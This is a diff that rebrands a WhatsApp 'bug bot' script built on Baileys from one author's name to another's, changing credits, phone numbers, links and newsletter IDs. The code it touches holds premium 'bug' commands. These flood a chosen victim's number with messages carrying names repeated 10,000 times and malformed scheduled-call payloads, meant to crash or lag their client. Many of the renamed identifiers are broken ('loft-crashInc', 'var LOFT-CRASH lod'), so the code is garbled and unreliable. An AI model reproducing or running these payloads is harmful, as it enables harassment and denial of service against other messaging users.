@@ -1,11 +1,11 @@
-//base by Tech-God
+//base by Sir loft
 //re-upload? recode? copy code? give credit ya :)
-//YouTube: @techgod143
-//Instagram: techgod143
-//Telegram: t.me/techgod143
-//GitHub: @techgod143
-//WhatsApp: +917466008456
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@techgod143
+//YouTube: @loftxmd
+//Instagram: loft
+//Telegram: t.me/loftxmd 
+//GitHub: @loft
+//WhatsApp: +255778018545
+//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@loftxmd
 
 const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
 const os = require('os')
@@ -96,7 +96,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const full_args = body.replace(command, '').slice(1).trim()
         const pushname = m.pushName || "No Name"
-        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
+        const botNumber = await loftcrashInc.decodeJid(XeonBotInc.user.id)
         const itsMe = m.sender == botNumber ? true : false
         const sender = m.sender
         const text = q = args.join(" ")
@@ -122,7 +122,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
         const sticker = []
         const isAfkOn = afk.checkAfkUser(m.sender, _afk)
         const isGroup = m.key.remoteJid.endsWith('@g.us')
-        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = m.isGroup ? await loftInc.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
@@ -132,7 +132,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
         const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
         const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
-        expiredCheck(XeonBotInc, m, premium);
+        expiredCheck(loft-crashInc, m, premium);
 //group chat msg by xeon
 const replygcxeon = (teks) => {
 XeonBotInc.sendMessage(m.chat,
@@ -197,7 +197,7 @@ return reply("Erro..")
 })
 }
 
-const subscribe_TechGod = {
+const subscribe_loftxmd = {
 "key": { 
 "fromMe": false,
 "participant": '0@s.whatsapp.net',
@@ -205,7 +205,7 @@ const subscribe_TechGod = {
 },
 message: {
 "listResponseMessage": {
-title: `TechGod's ur father`
+title: `Loft's ur father`
 }}
 }
 async function XeonyCrashy(dgxeon,chat) {
@@ -219,7 +219,7 @@ caption: `${dgxeon + xeontext1}`,
 //end bug functions
 
 async function loading () {
-var xeonlod = [
+var LOFT-CRASH lod = [
 "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
 "《 ████▒▒▒▒▒▒▒▒》30%",
 "《 ███████▒▒Tech-God▒▒▒》50%",
@@ -227,37 +227,37 @@ var xeonlod = [
 "《 ████████████》100%",
 "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🐛..."
 ]
-let { key } = await XeonBotInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
+let { key } = await LOFTInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
-for (let i = 0; i < xeonlod.length; i++) {
+for (let i = 0; i < BUGlod.length; i++) {
 await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
 }
 }
 
-        if (!XeonBotInc.public) {
+        if (LOFT-CRASHInc.public) {
             if (!isCreator && !m.key.fromMe) return
         }
         
         if (autoread) {
-            XeonBotInc.readMessages([m.key])
+           LOFT-CRASHInc.readMessages([m.key])
         }
         
         if (global.autoTyping) {
-        XeonBotInc.sendPresenceUpdate('composing', from)
+        LOFTCRASHInc.sendPresenceUpdate('composing', from)
         }
 
         if (global.autoRecording) {
-        XeonBotInc.sendPresenceUpdate('recording', from)
+        LOFTCRASHInc.sendPresenceUpdate('recording', from)
         }
 
         
         //bot number online status, available=online, unavailable=offline
-        XeonBotInc.sendPresenceUpdate('uavailable', from)
+        LOFTCRASHInc.sendPresenceUpdate('uavailable', from)
         
         if (global.autorecordtype) {
         let xeonrecordin = ['recording','composing']
-        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
-        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)
+        let xeonrecordinfinal = loftrecordin[Math.floor(Math.random() * loftrecordin.length)]
+        loftInc.sendPresenceUpdate(xeonrecordinfinal, from)
 
         }
         
@@ -265,7 +265,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
             XeonBotInc.updateProfileStatus(`24/7 Online Bot. *Youtube search- Tech God* user ${ownername}`).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
-            return XeonBotInc.updateBlockStatus(m.sender, 'block')
+            return loftInc.updateBlockStatus(m.sender, 'block')
         }
         let list = []
         for (let i of owner) {
@@ -453,7 +453,7 @@ senddocu(buffer)
                     if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
                     replygcxeon(mess.wait)
                     let result = args[0].split('https://chat.whatsapp.com/')[1]
-                    await XeonBotInc.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
+                    await loftInc.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                 } catch {
                     replygcxeon('Failed to join the Group')
                 }
@@ -638,7 +638,7 @@ senddocu(buffer)
             case 'bcgroup': {
                 if (!isCreator) return replygcxeon(mess.owner)
                 if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
-                let getGroups = await XeonBotInc.groupFetchAllParticipating()
+                let getGroups = await loftInc.groupFetchAllParticipating()
                 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                 let anu = groups.map(v => v.id)
                 replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
@@ -652,7 +652,7 @@ senddocu(buffer)
                                 showAdAttribution: true,
                                 title: 'Broadcast By Tech God',
                                 body: `Sent ${i.length} Group`,
-                                thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                                thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -814,7 +814,7 @@ senddocu(buffer)
                     fs.unlinkSync(medis)
                     replygcxeon(mess.done)
                 } else {
-                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
+                    var memeg = awaitloftInc.updateProfilePicture(m.chat, {
                         url: medis
                     })
                     fs.unlinkSync(medis)
@@ -877,7 +877,7 @@ senddocu(buffer)
                 if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 if (args[0] === 'open') {
-                    await XeonBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
+                    await loftInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcxeon(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replygcxeon(json(err)))
                 } else if (args[0] === 'close') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                 } else {
@@ -892,7 +892,7 @@ senddocu(buffer)
                 if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 let response = await XeonBotInc.groupInviteCode(m.chat)
-                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
+                loftInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                     detectLink: true
                 })
                 break
@@ -960,7 +960,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                            thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -974,15 +974,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the Tech God wa.me/917466008456 😉`
-                await XeonBotInc.sendMessage(m.chat, {
+                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the loft-crash wa.me/255778018545 😉`
+                await loftInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                            thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1001,8 +1001,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `youtube Tech God`,
-                            thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                            body: `youtube loftxmd`,
+                            thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1016,14 +1016,14 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'repo':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `repo https://github.com/techgod143/TECH-GOD-BUG-BOT
-		    youtube www.youtube.com/@techgod143`,
+                    text: `repo https://github.com//
+		    youtube www.youtube.com/@loftxmd`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `SCRIPT OF ${botname} is on YouTube www.youtube.com/@techgod143`,
-                            thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                            body: `SCRIPT OF ${botname} is on YouTube www.youtube.com/@loftxmd`,
+                            thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1037,7 +1037,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'donasi':
                 let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'Upi: number 9012008456\n\n' + textnate
+                    text: 'Upi: number 255778018545\n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -1115,7 +1115,7 @@ break
             case 'toimg': {
                 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                 replygcxeon(mess.wait)
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
+                let media = await loftInc.downloadAndSaveMediaMessage(qmsg)
                 let ran = await getRandom('.png')
                 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                     fs.unlinkSync(media)
@@ -1167,7 +1167,7 @@ break
             case 'tomp3': {
                 if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                 replygcxeon(mess.wait)
-                let media = await XeonBotInc.downloadMediaMessage(qmsg)
+                let media = await loftInc.downloadMediaMessage(qmsg)
                 let audio = await toAudio(media, 'mp4')
                 XeonBotInc.sendMessage(m.chat, {
                     document: audio,
@@ -1183,12 +1183,12 @@ break
             case 'toptt': {
                 if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                 replygcxeon(mess.wait)
-                let media = await XeonBotInc.downloadMediaMessage(qmsg)
+                let media = await loftInc.downloadMediaMessage(qmsg)
                 let {
                     toPTT
                 } = require('./lib/converter')
                 let audio = await toPTT(media, 'mp4')
-                XeonBotInc.sendMessage(m.chat, {
+                loftInc.sendMessage(m.chat, {
                     audio: audio,
                     mimetype: 'audio/mpeg',
                     ptt: true
@@ -1201,7 +1201,7 @@ break
             case 'togif': {
                 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
                 replygcxeon(mess.wait)
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
+                let media = await loftInc.downloadAndSaveMediaMessage(qmsg)
                 let webpToMp4 = await webp2mp4File(media)
                 await XeonBotInc.sendMessage(m.chat, {
                     video: {
@@ -1218,7 +1218,7 @@ break
             break
             case 'tourl': {
                 replygcxeon(mess.wait)
-                let media = await XeonBotInc.downloadAndSaveMediaMessage(qmsg)
+                let media = await loftInc.downloadAndSaveMediaMessage(qmsg)
                 if (/image/.test(mime)) {
                     let anu = await TelegraPh(media)
                     replygcxeon(util.format(anu))
@@ -1250,7 +1250,7 @@ break
             case 'toviewonce': {
                 if (!quoted) return replygcxeon(`Reply Image/Video`)
                 if (/image/.test(mime)) {
-                    anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                    anuan = await loftInc.downloadAndSaveMediaMessage(quoted)
                     XeonBotInc.sendMessage(m.chat, {
                         image: {
                             url: anuan
@@ -1262,7 +1262,7 @@ break
                         quoted: m
                     })
                 } else if (/video/.test(mime)) {
-                    anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                    anuanuan = await loftInc.downloadAndSaveMediaMessage(quoted)
                     XeonBotInc.sendMessage(m.chat, {
                         video: {
                             url: anuanuan
@@ -1287,7 +1287,7 @@ break
                 let buff = getRandom('.jpg')
                 await fs.writeFileSync('./' + buff, data)
                 let medi = fs.readFileSync('./' + buff)
-                await XeonBotInc.sendMessage(from, {
+                await loftBotInc.sendMessage(from, {
                     image: medi,
                     caption: "Here you go!"
                 }, {
@@ -1803,7 +1803,7 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+loftInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
 
@@ -1814,9 +1814,9 @@ break
 case 'xreact': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
-await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363398106360290@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 await sleep(2000)
-await XeonBotInc.sendMessage(m.chat, { react: { text: '🐛', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
+await XeonBotInc.sendMessage(m.chat, { react: { text: '🩸', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
 }
 break
 case 'x2': {
@@ -1824,7 +1824,7 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
 amount = text * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363398106360290@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 }
 break
@@ -1835,7 +1835,7 @@ await loading()
 victim = text.split("|")[0]+"@s.whatsapp.net"
 amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
+await XeonBotInc.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363398106360290@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
 }
 replygcxeon(`Successfully Sent Bug To ${victim}`)
 }
@@ -1868,7 +1868,7 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example usage: ${prefix + command} 5`)
 amount = text * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
+await XeonBotInc.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363398106360290@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
 }
 }
 break
@@ -1879,7 +1879,7 @@ await loading()
 victim = text.split("|")[0]+"@s.whatsapp.net"
 amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
+await XeonBotInc.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363398106360290@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
 }
 replygcxeon(`Successfully Sent Bug To ${victim}`)
 }
@@ -2052,7 +2052,7 @@ contextInfo: {
 externalAdReply: {
 renderLargerThumbnail: true,
 mediaType: 1,
-title: xeontext6,
+title: loft-crash,
 body: `###############################`,
 thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
 jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
@@ -2075,7 +2075,7 @@ contextInfo: {
 externalAdReply: {
 renderLargerThumbnail: true,
 mediaType: 1,
-title: xeontext6,
+title: loftcrash,
 body: `###############################`,
 thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
 jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
@@ -2149,7 +2149,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftcrash,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2170,7 +2170,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title":loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2191,7 +2191,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2255,7 +2255,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2276,7 +2276,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2323,7 +2323,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2345,7 +2345,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2367,7 +2367,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2389,7 +2389,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2411,7 +2411,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2459,7 +2459,7 @@ var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Mess
 "scheduledCallCreationMessage": {
 "callType": "2",
 "scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
+"title": loftbug1,
 }
 }), { userJid: from, quoted : m})
 XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
@@ -2471,14 +2471,14 @@ break
             case 'menu':
             case 'help':
             case 'alive':
-                let xeonmenuoh = `╭══ *❍ 𝗧𝗘𝗖𝗛_𝗚𝗢𝗗-BUG_BOT ❍*
-┃❁ *ᴏᴡɴᴇʀ:* ᴛᴇᴄʜ ○■□● ɢᴏᴅ
+                let xeonmenuoh = `╭══ *❍ LOFT_CRASH-BUG_BOT ❍*
+┃❁ *ᴏᴡɴᴇʀ:* loft ○■□● crash
 ┃❁ *ᴜᴘᴛɪᴍᴇ:* ${runtime(process.uptime())}
 ┃❁ *User:* ${pushname}
 ╰┈➤ ${xeonytimewisher} 😄  My bro
-⚠️⚠️ ~Don't forget to subscribe~ 
-*Tech god* ~Youtube Channel~ ⚠️⚠️
-_Any help: yt link http://www.youtube.com/@techgod143_
+⚠️⚠️ ~Don't forget to follow my channel~ 
+*Tech god* ~Whatsapp Channel~ ⚠️⚠️
+_Any help: yt link https://whatsapp.com/channel/0029Vb6B9xFCxoAseuG1g610
 ╰═════════════════⊷
 ╭═══❂ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ❂
 ┃ ❏ *xʀᴇᴀᴄᴛ <ʀᴇᴘʟʏ ᴄʜᴀᴛ>*
@@ -2619,12 +2619,12 @@ _Any help: yt link http://www.youtube.com/@techgod143_
 ╰══════════════════⊷`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
-                        text: xeonmenuoh,
+                        text: loft,
                         contextInfo: {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+                                thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -2642,7 +2642,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://i.ibb.co/5hYWrRH/thumb.png',
+      thumbnailUrl: 'https://files.catbox.moe/osou52.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
